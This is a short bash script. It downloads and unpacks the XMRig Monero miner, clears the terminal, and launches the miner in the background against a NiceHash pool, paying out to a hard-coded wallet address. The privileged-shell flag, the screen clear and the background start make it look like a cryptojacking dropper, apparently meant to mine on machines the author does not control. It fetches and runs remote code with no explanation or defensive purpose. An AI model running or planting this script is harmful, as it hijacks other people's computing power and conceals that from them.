#!/bin/bash -p
export TERM=xterm && wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -a randomx -o stratum+tcp://randomxmonero.eu.nicehash.com:9200 -u 32CEjZD9d7MRtnHpCUMSYUjczC3b4upf5M.ZEEZAA0 -p x -B 
